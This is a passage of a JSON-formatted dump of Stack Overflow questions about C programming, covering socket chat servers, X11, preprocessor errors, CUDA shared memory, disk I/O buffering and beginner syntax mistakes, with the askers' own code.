this?</p>\n"},{"tags":["c","x11","xlib","xserver"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13179240,"title":"How to write on root window in x11?","body":"<p>I've already read a lot of questions titled like this one, but none results in an answer that fits my needs.</p>\n\n<p>I want to write some stuff on my root-window (in C) for displaying stuff like uptime as an example. The problem is: I want to have this as background <em>all the time</em>! \nThere is one way to use a background image and draw onto this and set it as background, but thats ugly. Another way would be to write onto the rootwindow and refreshing it all the time, so if another window covers and uncovers my printed stuff, it will be refreshed in almost no time. But that isn't really an answer because energy/cputime is expensive.</p>\n\n<p>kind regards.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1296,"score":0,"question_id":4323904,"title":"socket chat application i.e i want to chat with multiple clients at a time?","body":"<p>I am working on socket chat application, i.e I want to chat with multiple clients at a time. I have written the folllowing program. The server accepts multiple clients, but I am able to chat with only latest client. I am not able chat with previous client, can someone explain to me why?</p>\n\n<pre><code>/* tcpserver.c */\n\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;string.h&gt;\n#include &lt;pthread.h&gt;\n\nvoid *thread(int *);\n\nint main()\n{\n        int sock, connected, true = 1,n=1; \n    pthread_t tid;\n        struct sockaddr_in server_addr,client_addr;   \n        int sin_size;\n\n        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n            perror(\"Socket\");\n            exit(1);\n        }\n\n        if (setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&amp;true,sizeof(int)) == -1) {\n            perror(\"Setsockopt\");\n            exit(1);\n        }\n\n        server_addr.sin_family = AF_INET;        \n        server_addr.sin_port = htons(5000);    \n        server_addr.sin_addr.s_addr = INADDR_ANY;\n        bzero(&amp;(server_addr.sin_zero),8);\n\n        if (bind(sock, (struct sockaddr *)&amp;server_addr, sizeof(struct sockaddr))\n                                                                       == -1) {\n            perror(\"Unable to bind\");\n            exit(1);\n        }\n\n        if (listen(sock, 5) == -1) {\n            perror(\"Listen\");\n            exit(1);\n        }\n\n    printf(\"\\nTCPServer Waiting for client on port 5000\");\n        fflush(stdout);\n\n\n        while(n&lt;=5)\n        { \n\n            sin_size = sizeof(struct sockaddr_in);\n\n            connected = accept(sock, (struct sockaddr *)&amp;client_addr,&amp;sin_size);\n\n            printf(\"\\n I got a connection from (%s , %d)\",\n                   inet_ntoa(client_addr.sin_addr),ntohs(client_addr.sin_port));\n        pthread_create(&amp;tid,NULL,thread,&amp;connected);\n        n++;\n    }\n\n      close(sock);\n      return 0;\n}\n\n\nvoid *thread(int *nfd)\n{\n        char send_data [1024] , recv_data[1024];      \n        int bytes_recieved;   \n        while (1)\n            {\n              printf(\"\\n SEND (q or Q to quit) : \");\n              gets(send_data);\n\n              if (strcmp(send_data , \"q\") == 0 || strcmp(send_data , \"Q\") == 0)\n              {\n                send(*nfd, send_data,strlen(send_data), 0);\n                close(nfd);\n                break;\n              }\n\n              else\n                 send(*nfd, send_data,strlen(send_data), 0); \n\n              bytes_recieved = recv(*nfd,recv_data,1024,0);\n\n              recv_data[bytes_recieved] = '\\0';\n\n              if (strcmp(recv_data , \"q\") == 0 || strcmp(recv_data , \"Q\") == 0)\n              {\n                close(*nfd);\n                break;\n              }\n\n              else\n              printf(\"\\n RECIEVED DATA = %s \" , recv_data);\n              fflush(stdout);\n            }\n\n}\n\n\n\n\n\n\n\n/* tcpclient.c */\n\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;netdb.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n\n\nint main()\n\n{\n\n        int sock, bytes_recieved; \n        char send_data[1024],recv_data[1024];\n        struct hostent *host;\n        struct sockaddr_in server_addr; \n\n        host = gethostbyname(\"127.0.0.1\");\n\n        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n            perror(\"Socket\");\n            exit(1);\n        }\n\n        server_addr.sin_family = AF_INET;    \n        server_addr.sin_port = htons(5000);  \n        server_addr.sin_addr = *((struct in_addr *)host-&gt;h_addr);\n        bzero(&amp;(server_addr.sin_zero),8);\n\n        if (connect(sock, (struct sockaddr *)&amp;server_addr,\n                    sizeof(struct sockaddr)) == -1)\n        {\n            perror(\"Connect\");\n            exit(1);\n        }\n\n        while(1)\n        {\n\n          bytes_recieved=recv(sock,recv_data,1024,0);\n          recv_data[bytes_recieved] = '\\0';\n\n          if (strcmp(recv_data , \"q\") == 0 || strcmp(recv_data , \"Q\") == 0)\n          {\n           close(sock);\n           break;\n          }\n\n          else\n           printf(\"\\nRecieved data = %s \" , recv_data);\n\n           printf(\"\\nSEND (q or Q to quit) : \");\n           gets(send_data);\n\n          if (strcmp(send_data , \"q\") != 0 &amp;&amp; strcmp(send_data , \"Q\") != 0)\n           send(sock,send_data,strlen(send_data), 0);\n\n          else\n          {\n           send(sock,send_data,strlen(send_data), 0);  \n           close(sock);\n           break;\n          }\n\n        }  \nreturn 0;\n}\n</code></pre>\n"},{"tags":["c","linux","data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":9372679,"title":"Data Structure for managing groups in a chat server","body":"<p>I have a chat client in flash using binary sockets and a server in C/linux using sockets and libev. I have everything working properly for sending and receiving messages but now I am on to the more complicated step. </p>\n\n<p>For my chat server I will be grouping users into groups of 15. The server will need to have a unique ID for each user and be able to quickly determine which group a user is in to broadcast the message to the other 14 users. I'm thinking the server could use the file descriptor for each socket connection as those should all be unique.</p>\n\n<p><strong>The problem is this:</strong> you get a read event fired from libev for a certain file descriptor. You now need to quickly determine which group this FD belongs to and then broadcast the message to everyone in the group. <em>What is the best data structure for this problem?</em></p>\n"},{"tags":["c","homework","sockets"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":774,"score":2,"question_id":3711667,"title":"Chat Server with sockets in C","body":"<p>I'm trying to write a chat server in C that allows communication between two clients using POSIX sockets. I'm not sure I have a good grasp on this concept or how I should set up the communication protocol between the clients and the server.</p>\n\n<p>I know I need one socket to <code>bind()</code> the server port to so I can accept incoming connections from clients, but in order to have two clients connected at the same time do I need to create a socket for each of these clients when I <code>accept()</code> or should I <code>accept()</code> a client and then <code>fork()</code> so I can have another client accept? I'm not worried about concurrent chatting yet, it's more of a ping-pong approach where the clients need to wait for a <code>recv()</code> after they <code>send()</code> before they can type a new message.</p>\n"},{"tags":["c","linux","gcc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":34,"score":2,"question_id":13189365,"title":"How to remove this warning: second parameter of ‘va_start’ not last named argument?","body":"<p>I have a function(see below) that is emitting the following warning:</p>\n\n<blockquote>\n  <p>second parameter of ‘va_start’ not last named argument</p>\n</blockquote>\n\n<p>What does it means and how to remove it?</p>\n\n<p>the function is as the following:</p>\n\n<pre><code>static int  ui_show_warning(GtkWindow *parent, const gchar *fmt, size_t size, ...)\n    {\n      GtkWidget *dialog = NULL;\n      va_list args = NULL;\n      int count = -1;\n      char *msg = NULL;\n\n      if((msg = malloc(size + 1)) == NULL)\n        return -12;\n\n      va_start(args, fmt);\n\n      if((count = snprintf(msg, size, fmt, args)) &lt; 0)\n        goto outer;\n\n      dialog = gtk_message_dialog_new(parent,\n                      GTK_DIALOG_DESTROY_WITH_PARENT,\n                      GTK_MESSAGE_WARNING,\n                      GTK_BUTTONS_OK,\n                      \"%s\", msg);\n      (void) gtk_dialog_run(GTK_DIALOG(dialog));\n\n      gtk_widget_destroy(dialog);\n\n     outer: {\n        if(args != NULL)\n          va_end(args);\n\n        if(msg != NULL)\n          free(msg);\n\n        return count;\n      }\n    }\n</code></pre>\n\n<p>Note: suggestion to improve this code are very appreciated.</p>\n"},{"tags":["c","montecarlo"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13189020,"title":"monte carlo simulation multiple correlated values in C","body":"<p>I need to put together a function that will generate the values for a monte carlo simulation.</p>\n\n<p>The input will be each variables mean &amp; std dev, and the 2 variables correction. The variables are log normally distributed.</p>\n\n<p>Output will be the monthly values of each of the 2 variables over the life of the simulation, with the correlation being close to the inputted correlation.</p>\n\n<p>Is there any library that exists in C for me to do this? </p>\n\n<p>I have read some about Cholesky Decompositions, but not sure that it will work for log normally distributed variables.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["c","sockets","tcp"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":57,"score":4,"question_id":13184349,"title":"Limit Incoming TCP Connections based on IP","body":"<p>Do sockets in C offer any kind of way to limit the number of incoming connections to the socket based on the IP?</p>\n\n<p>For example, to prevent one client IP from spamming connections, is there a way to limit the number of times an IP can connect to a socket?</p>\n\n<p>Or does something like this have to be custom made?</p>\n"},{"tags":["c","http","post","webkit","gecko"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":283,"score":0,"question_id":8927219,"title":"Transfer large files using HTTP/POST","body":"<p>How can I upload (very) large file with HTTP protocol in C (or C++)?</p>\n\n<p>I know it's not the right way to upload huge files, but that's not the point.</p>\n\n<p>I've already seen sources about POST transfers of files in C++ but I noticed that, each time, the WHOLE binary file was included inside the POST sequence (between \"--boundary\").</p>\n\n<p>So, before going deeper and deeper into Webkit/Gecko source code, does somebody know how do they do?</p>\n"},{"tags":["c","gcc","ctype"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13189109,"title":"Why do not I get an error even when I have commented the header and used its function?","body":"<p>In the following program I commented the statement <code>#include &lt;ctype.h&gt;</code> in the hope that an error will be thrown while using the functions like <code>isupper</code> and <code>isgraph</code>. But to my surprise no error is thrown. Why is this so ? The <a href=\"http://en.wikipedia.org/wiki/C_character_classification\" rel=\"nofollow\">wikipedia</a> page lists these functions in the header type <code>ctype.h</code>.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n//#include &lt;ctype.h&gt;\n\nint main() {\nchar ch;\nfor(;;) {\n   ch = getc(stdin);\n   if( ch == '.') break;\n   int g = isgraph(ch);\n   if(isupper(ch) != 0) printf(\"Is in upper case\\n\");\n}   \nreturn 0;   \n }\n</code></pre>\n\n<p><em>Note:</em> I am using <code>gcc</code> to compile on linux (fedora). </p>\n"},{"tags":["c","performance","sse","vectorization","avx"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13183258,"title":"Union with __m256 and array of two __m128","body":"<p>Can I have a union like this</p>\n\n<pre><code>  union eight_floats_t\n  {\n    __m256 a;\n    __m128 b[2];\n  };\n  eight_floats_t eight_floats;\n</code></pre>\n\n<p>to have an instant access to the two 128 bit parts of a 256 bit register?</p>\n\n<p>Edit: I was asking to understand the performance impact of this approach.</p>\n"},{"tags":["c","c-preprocessor"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13188732,"title":"#ifdef #else - neither branch chosen","body":"<p>I have the following code</p>\n\n<pre><code>#if defined(TESTING)\n#define TEST_FAILED_IN_VMC(...) TestFailed(__FILE__, __LINE__, __VA_ARGS__)\n#define TEST_FAILED_IN_UNIT_TEST(...) TestFailedInUnitTest(__VA_ARGS__)\n#else\n#define TEST_FAILED_IN_VMC(...)\n#define TEST_FAILED_IN_UNIT_TEST(...)\n#endif\n</code></pre>\n\n<p>and make a call <code>TEST_FAILED_IN_VMC(peripheral, testSuiteName, testName, \n                                    \"Internal coding error; bad state (%d)\", state);</code></p>\n\n<p>and the compiler complians that <code>testSuiteName</code> and <code>testName</code> are not defined - even though <code>#TESTING</code> is not defined.</p>\n\n<p>[Update] The compiler also says <code>\"Error 3   implicit declaration of function 'TEST_FAILED_IN_VMC'</code></p>\n\n<hr>\n\n<p>[Update] Please ignore veryting below this line. The problem is above. Thanks.</p>\n\n<p>So, I tried this [Update] <code>else</code> should be <code>#else</code>, then I am told that <code>TESTING</code> is not defiend. SO, why is the code above not working?</p>\n\n<pre><code>#if defined(TESTING)\n#error \"Testing is defined &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\"\nwf\nelse\n#error \"Testing is NOT defined &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\"\neyh6\n#endif\n\n#ifdef TESTING\n#error \"Testing is defined @@\"\nehye\nelse\n#error \"Testing is NOT defined @@\"\n5he567\n#endif\n\n#error \"Sample error ###\"\n</code></pre>\n\n<p>and the only error the compiler gave was <code>Error 3   #error \"Sample error ###\"</code></p>\n\n<p>Any idea what is going wrong? (Atmel AVR Studio, which is based on Microsoft Visual studio`.</p>\n\n<p>Many, many, many other <code>#if defined</code> are working just fine ...</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13188804,"title":"How to get out of an \"if\" while I'm reading a file?","body":"<p>My problem is that I enter in an \"if\" and the code doesn't continue reading the file!\nI need to continue reading the file and comparing proxcasa and saux!\nI think <code>fseek()</code> will solve that problem, but where and how should I use it in my code?</p>\n\n<pre><code>void ler_tabuleiro(lista_tabuleiro *t,FILE *entrada)\n{\n    TipoTabuleiro tabu;\n    char proxcasa[100], regracasa[100], saux[20];\n    strcpy(saux,\"0\");\n    strcpy(proxcasa,\"0\");\n\n    while(!feof(entrada))\n    {\n        fscanf(entrada,\" %s \",tabu.casa ); // nessa primeira leitura vamos ver se é tabuleiro\n\n        if(strcmp(tabu.casa,\"TABULEIRO\")==0)\n        {\n            fscanf(entrada,\"%s\",tabu.casa);\n        }\n        else if( (strcmp(tabu.casa, \"JOGADAS\") == 0) || (strcmp(tabu.casa, \"FIM\") == 0) )\n        {\n            break;\n        }\n\n        if(strcmp(proxcasa,saux)==0) // o problema tá aqui !!! como proxcasa vai ser 0 ?\n        {\n            printf(\"entrou\");\n            fscanf(entrada, \"%s %s %d\",proxcasa,regracasa, &amp;tabu.energia);\n            printf(\"%s %s %s %d \",tabu.casa, proxcasa,regracasa,tabu.energia);\n            inserirprimeiro(tabu,t,regracasa);\n            strcpy(saux,tabu.casa);\n        }\n    }\n}\n</code></pre>\n"},{"tags":["c","linux","linux-kernel","scheduling","scheduler"],"answer_count":4,"favorite_count":7,"up_vote_count":10,"down_vote_count":0,"view_count":2528,"score":10,"question_id":3086864,"title":"How to create a new Linux kernel scheduler","body":"<p>Looking through the scheduler source code (2.6.34, kernel/sched.c), I can see how the \"pluggable\" schedulers are used, and I believe I understand the interface to be implemented.  What I don't understand yet is how to get my code built into the kernel.  At the very least, pointers to other sites would be appreciated.</p>\n\n<p>Right now, I'm grepping for SCHED_FIFO, SCHED_RR, and SCHED_NORMAL in the kernel source tree, so really I'm looking for a more insightful way to look at it :-)</p>\n\n<p>EDIT: As some background, I'm very familiar with the FreeBSD scheduler (and the FreeBSD kernel in general), so I'm not looking for pointers on how to do process/thread level scheduling.  I'm looking for a way to add my own scheduler alongside the normal linux schedulers (similar to SCHED_FIFO).</p>\n\n<p>EDIT #2:  The BFS pointer below is a good start, but it still rips CFS out of the kernel.  sched.c now looks like:</p>\n\n<pre><code>#ifdef CONFIG_SCHED_BFS\n#include \"sched_bfs.c\"\n#else\n   // original sched.c \n#endif // CONFIG_SCHED_BFS\n</code></pre>\n\n<p>I'd love to see an answer or a pointer on how to do this a little better (ie, keep CFS, at least for right now).</p>\n\n<p>EDIT #3:  I've answered my own question below, as I think I've figured it out.</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":29,"score":-1,"question_id":13188705,"title":"error: expected primary-expression before \"__attribute__\"; error: expected ';' before \"__attribute__\"","body":"<p>I am compiling a C program on Solaris 10 for x86, the code is:</p>\n\n<pre><code>#if defined (__GNUC_MINOR__)&amp;&amp;2093&lt;=(__GNUC__*1000+__GNUC_MINOR__) __attribute__ ((__unused__))\n#endif\n</code></pre>\n\n<p>When I compile this, I get the error message:</p>\n\n<pre><code>error: expected primary-expression before \"__attribute__\"; error: expected ';' before \"__attribute__\"\n</code></pre>\n\n<p>What's going wrong, and how do I fix it?</p>\n"},{"tags":["objective-c","c","pointers"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12737637,"title":"Swap a pointer between two objects","body":"<p>I have three pointers, <code>*player1</code>, <code>*player2</code> and <code>*currentPlayer</code>.</p>\n\n<p>The pointer <code>*currentPlayer</code> will always be pointing to either <code>*player1</code> or <code>*player2</code>.  To switch between the two, I've been doing the following:</p>\n\n<pre><code>if (currentPlayer == player1) {\n        currentPlayer = player2;\n}\nelse {\n    currentPlayer = player1;\n}\n</code></pre>\n\n<p>My question is, is there a simpler, more elegant way to swap between these two pointers?</p>\n"},{"tags":["c++","c","enums","preprocessor"],"answer_count":15,"favorite_count":19,"up_vote_count":30,"down_vote_count":0,"view_count":27485,"score":30,"question_id":147267,"title":"Easy way to use variables of enum types as string in C?","body":"<p>Here's what I am trying to do:  </p>\n\n<pre><code>typedef enum { ONE, TWO, THREE } Numbers;\n</code></pre>\n\n<p>I am trying to write a function that would do a switch case similar to the following: </p>\n\n<pre><code>char num_str[10];\nint process_numbers_str(Numbers num) {\n  switch(num) {\n    case ONE:\n    case TWO:\n    case THREE:\n    {\n      strcpy(num_str, num); //some way to get the symbolic constant name in here?\n    } break;\n    default:\n      return 0; //no match\n  return 1;\n}\n</code></pre>\n\n<p>Instead of defining at every case, is there a way to set it using the enum variable like I am trying to do above?</p>\n"},{"tags":["c","file-io","buffer"],"answer_count":2,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":94,"score":10,"question_id":13171052,"title":"What goes on behind the curtains during disk I/O?","body":"<p>When I seek to some position in a file and write a small amount of data (20 bytes), what goes on behind the scenes?</p>\n\n<p><strong>My understanding</strong></p>\n\n<p>To my knowledge, the smallest unit of data that can be written or read from a disk is one sector (traditionally 512 bytes, but that standard is now changing).  That means to write 20 bytes I need to read a whole sector, modify some of it in memory and write it back to disk.</p>\n\n<p>This is what I expect to be happening in unbuffered I/O.  I also expect buffered I/O to do roughly the same thing, but be clever about its cache.  So I would have thought that if I blow locality out the window by doing random seeks and writes, both buffered and unbuffered I/O ought to have similar performance...  maybe with unbuffered coming out slightly better.</p>\n\n<p>Then again, I know it's crazy for buffered I/O to only buffer one sector, so I might also expect it to perform terribly.</p>\n\n<p><strong>My application</strong></p>\n\n<p>I am storing values gathered by a SCADA device driver that receives remote telemetry for upwards of a hundred thousand points.  There is extra data in the file such that each record is 40 bytes, but only 20 bytes of that needs to be written during an update.</p>\n\n<p><strong>Pre-implementation benchmark</strong></p>\n\n<p>To check that I don't need to dream up some brilliantly over-engineered solution, I have run a test using a few million random records written to a file that could contain a total of 200,000 records.  Each test seeds the random number generator with the same value to be fair.  First I erase the file and pad it to the total length (about 7.6 meg), then loop a few million times, passing a random file offset and some data to one of two test functions:</p>\n\n<pre><code>void WriteOldSchool( void *context, long offset, Data *data )\n{\n    int fd = (int)context;\n    lseek( fd, offset, SEEK_SET );\n    write( fd, (void*)data, sizeof(Data) );\n}\n\nvoid WriteStandard( void *context, long offset, Data *data )\n{\n    FILE *fp = (FILE*)context;\n    fseek( fp, offset, SEEK_SET );\n    fwrite( (void*)data, sizeof(Data), 1, fp );\n    fflush(fp);\n}\n</code></pre>\n\n<p><strong>Maybe no surprises?</strong></p>\n\n<p>The <code>OldSchool</code> method came out on top - by a lot.  It was over 6 times faster (1.48 million versus 232000 records per second).  To make sure I hadn't run into hardware caching, I expanded my database size to 20 million records (file size of 763 meg) and got the same results.</p>\n\n<p>Before you point out the obvious call to <code>fflush</code>, let me say that removing it had no effect.  I imagine this is because the cache must be committed when I seek sufficiently far away, which is what I'm doing most of the time.</p>\n\n<p><strong>So, what's going on?</strong></p>\n\n<p>It seems to me that the buffered I/O must be reading (and possibly writing all of) a large chunk of the file whenever I try to write.  Because I am hardly ever taking advantage of its cache, this is extremely wasteful.</p>\n\n<p>In addition (and I don't know the details of hardware caching on disk), if the buffered I/O is trying to write a bunch of sectors when I change only one, that would reduce the effectiveness of the hardware cache.</p>\n\n<p>Are there any disk experts out there who can comment and explain this better than my experimental findings? =)</p>\n"},{"tags":["c","arrays","loops"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":13188498,"title":"Main in C not outputting print loop","body":"<p>my code:</p>\n\n<pre><code>int main(){\nint marks[100];\nint j;\nint i;\nprintf(\"hello world\");\nfor (i=0; i&gt;100; i++){\n   marks[i]=j;\n   printf(marks[i]);\n   j++;}\nreturn 0;\n}\n</code></pre>\n\n<p>I'm only getting the \"hello world\" output (which is a test). What am I doing wrong? </p>\n"},{"tags":["c","optimization","cuda"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13183893,"title":"How to avoid bank conflicts when loading data from global to shared memory","body":"<p>A problem involves strided accesses to an unsigned char array stored in global memory of a compute capability 1.3 GPU. In order to bypass the coalescence requirements of the global memory, the threads access sequentially the global memory and copy the array to the shared memory using only 2 memory transactions for the following example:</p>\n\n<pre><code>#include &lt;cuda.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n__global__ void kernel ( unsigned char *d_text, unsigned char *d_out ) {\n\n    int idx = blockIdx.x * blockDim.x + threadIdx.x;\n\n    extern __shared__ unsigned char s_array[];\n\n    uint4 *uint4_text = ( uint4 * ) d_text;\n    uint4 var;\n\n    //memory transaction\n    var = uint4_text[0];\n\n    uchar4 c0 = *reinterpret_cast&lt;uchar4 *&gt;(&amp;var.x);\n    uchar4 c4 = *reinterpret_cast&lt;uchar4 *&gt;(&amp;var.y);\n    uchar4 c8 = *reinterpret_cast&lt;uchar4 *&gt;(&amp;var.z);\n    uchar4 c12 = *reinterpret_cast&lt;uchar4 *&gt;(&amp;var.w);\n\n    s_array[threadIdx.x*16 + 0] = c0.x;\n    s_array[threadIdx.x*16 + 1] = c0.y;\n    s_array[threadIdx.x*16 + 2] = c0.z;\n    s_array[threadIdx.x*16 + 3] = c0.w;\n\n    s_array[threadIdx.x*16 + 4] = c4.x;\n    s_array[threadIdx.x*16 + 5] = c4.y;\n    s_array[threadIdx.x*16 + 6] = c4.z;\n    s_array[threadIdx.x*16 + 7] = c4.w;\n\n    s_array[threadIdx.x*16 + 8] = c8.x;\n    s_array[threadIdx.x*16 + 9] = c8.y;\n    s_array[threadIdx.x*16 + 10] = c8.z;\n    s_array[threadIdx.x*16 + 11] = c8.w;\n\n    s_array[threadIdx.x*16 + 12] = c12.x;\n    s_array[threadIdx.x*16 + 13] = c12.y;\n    s_array[threadIdx.x*16 + 14] = c12.z;\n    s_array[threadIdx.x*16 + 15] = c12.w;\n\n    d_out[idx] = s_array[threadIdx.x*16];\n}\n\nint main ( void ) {\n\n    unsigned char *d_text, *d_out;\n\n    unsigned char *h_out = ( unsigned char * ) malloc ( 32 * sizeof ( unsigned char ) );\n    unsigned char *h_text = ( unsigned char * ) malloc ( 32 * sizeof ( unsigned char ) );\n\n    int i;\n\n    for ( i = 0; i &lt; 32; i++ )\n        h_text[i] = 65 + i;\n\n    cudaMalloc ( ( void** ) &amp;d_text, 32 * sizeof ( unsigned char ) );\n    cudaMalloc ( ( void** ) &amp;d_out, 32 * sizeof ( unsigned char ) );\n\n    cudaMemcpy ( d_text, h_text, 32 * sizeof ( unsigned char ), cudaMemcpyHostToDevice );\n\n    kernel&lt;&lt;&lt;1,32,16128&gt;&gt;&gt;(d_text, d_out );\n\n    cudaMemcpy ( h_out, d_out, 32 * sizeof ( unsigned char ), cudaMemcpyDeviceToHost );\n\n    for ( i = 0; i &lt; 32; i++ )\n        printf(\"%c\\n\", h_out[i]);\n\n    return 0;\n}\n</code></pre>\n\n<p>The problem is that bank conflicts occur when copying the data to shared memory (384 conflicts for the above example as reported by nvprof) that lead to serialized accesses of the threads.</p>\n\n<p>The shared memory is divided into 16 (or 32 on newer device architectures) 32-bit banks in order to simultaneously serve the 16 threads of the same half-warp. The data are interleaved between the banks with the ith 32-bit word always being stored in the i % 16 - 1 shared memory bank.</p>\n\n<p>Since each threads reads 16 bytes with one memory transaction, the characters will be stored in a strided fashion to the shared memory. This results in conflicts between threads 0, 4, 8, 12; 1, 5, 9, 13; 2, 6, 10, 14; 3, 7, 11, 15 of the same half-warp. A naive way to eliminate bank conflicts would be to use if/else branching to store the data to shared memory in a round-robin fashion similar to the following, but resulting to some serious thread divergence:</p>\n\n<pre><code>int tid16 = threadIdx.x % 16;\n\nif ( tid16 &lt; 4 ) {\n\n    s_array[threadIdx.x * 16 + 0] = c0.x;\n    s_array[threadIdx.x * 16 + 1] = c0.y;\n    s_array[threadIdx.x * 16 + 2] = c0.z;\n    s_array[threadIdx.x * 16 + 3] = c0.w;\n\n    s_array[threadIdx.x * 16 + 4] = c4.x;\n    s_array[threadIdx.x * 16 + 5] = c4.y;\n    s_array[threadIdx.x * 16 + 6] = c4.z;\n    s_array[threadIdx.x * 16 + 7] = c4.w;\n\n    s_array[threadIdx.x * 16 + 8] = c8.x;\n    s_array[threadIdx.x * 16 + 9] = c8.y;\n    s_array[threadIdx.x * 16 + 10] = c8.z;\n    s_array[threadIdx.x * 16 + 11] = c8.w;\n\n    s_array[threadIdx.x * 16 + 12] = c12.x;\n    s_array[threadIdx.x * 16 + 13] = c12.y;\n    s_array[threadIdx.x * 16 + 14] = c12.z;\n    s_array[threadIdx.x * 16 + 15] = c12.w;\n\n} else if ( tid16 &lt; 8 ) {\n\n    s_array[threadIdx.x * 16 + 4] = c4.x;\n    s_array[threadIdx.x * 16 + 5] = c4.y;\n    s_array[threadIdx.x * 16 + 6] = c4.z;\n    s_array[threadIdx.x * 16 + 7] = c4.w;\n\n    s_array[threadIdx.x * 16 + 8] = c8.x;\n    s_array[threadIdx.x * 16 + 9] = c8.y;\n    s_array[threadIdx.x * 16 + 10] = c8.z;\n    s_array[threadIdx.x * 16 + 11] = c8.w;\n\n    s_array[threadIdx.x * 16 + 12] = c12.x;\n    s_array[threadIdx.x * 16 + 13] = c12.y;\n    s_array[threadIdx.x * 16 + 14] = c12.z;\n    s_array[threadIdx.x * 16 + 15] = c12.w;\n\n    s_array[threadIdx.x * 16 + 0] = c0.x;\n    s_array[threadIdx.x * 16 + 1] = c0.y;\n    s_array[threadIdx.x * 16 + 2] = c0.z;\n    s_array[threadIdx.x * 16 + 3] = c0.w;\n\n} else if ( tid16 &lt; 12 ) {\n\n    s_array[threadIdx.x * 16 + 8] = c8.x;\n    s_array[threadIdx.x * 16 + 9] = c8.y;\n    s_array[threadIdx.x * 16 + 10] = c8.z;\n    s_array[threadIdx.x * 16 + 11] = c8.w;\n\n    s_array[threadIdx.x * 16 + 12] = c12.x;\n    s_array[threadIdx.x * 16 + 13] = c12.y;\n    s_array[threadIdx.x * 16 + 14] = c12.z;\n    s_array[threadIdx.x * 16 + 15] = c12.w;\n\n    s_array[threadIdx.x * 16 + 0] = c0.x;\n    s_array[threadIdx.x * 16 + 1] = c0.y;\n    s_array[threadIdx.x * 16 + 2] = c0.z;\n    s_array[threadIdx.x * 16 + 3] = c0.w;\n\n    s_array[threadIdx.x * 16 + 4] = c4.x;\n    s_array[threadIdx.x * 16 + 5] = c4.y;\n    s_array[threadIdx.x * 16 + 6] = c4.z;\n    s_array[threadIdx.x * 16 + 7] = c4.w;\n\n} else {\n\n    s_array[threadIdx.x * 16 + 12] = c12.x;\n    s_array[threadIdx.x * 16 + 13] = c12.y;\n    s_array[threadIdx.x * 16 + 14] = c12.z;\n    s_array[threadIdx.x * 16 + 15] = c12.w;\n\n    s_array[threadIdx.x * 16 + 0] = c0.x;\n    s_array[threadIdx.x * 16 + 1] = c0.y;\n    s_array[threadIdx.x * 16 + 2] = c0.z;\n    s_array[threadIdx.x * 16 + 3] = c0.w;\n\n    s_array[threadIdx.x * 16 + 4] = c4.x;\n    s_array[threadIdx.x * 16 + 5] = c4.y;\n    s_array[threadIdx.x * 16 + 6] = c4.z;\n    s_array[threadIdx.x * 16 + 7] = c4.w;\n\n    s_array[threadIdx.x * 16 + 8] = c8.x;\n    s_array[threadIdx.x * 16 + 9] = c8.y;\n    s_array[threadIdx.x * 16 + 10] = c8.z;\n    s_array[threadIdx.x * 16 + 11] = c8.w;\n}\n</code></pre>\n\n<p>Anyone could come up with a better solution to this? I' ve already studied the reduction example of the SDK but i am not sure it is applicable to my problem.</p>\n"},{"tags":["c","operators"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":13188186,"title":"Operator in C: not greater and equal to.","body":"<p>Just a fast question:</p>\n\n<p>I'm trying to test if a variable is not greater than or equal to another variable.</p>\n\n<p>I have it coded as such:</p>\n\n<pre><code>if (f!&gt;=i){\nprint (\"True\");}\n</code></pre>\n\n<p>but my c compiler won't recognize it. I can't find it online, is it possible? 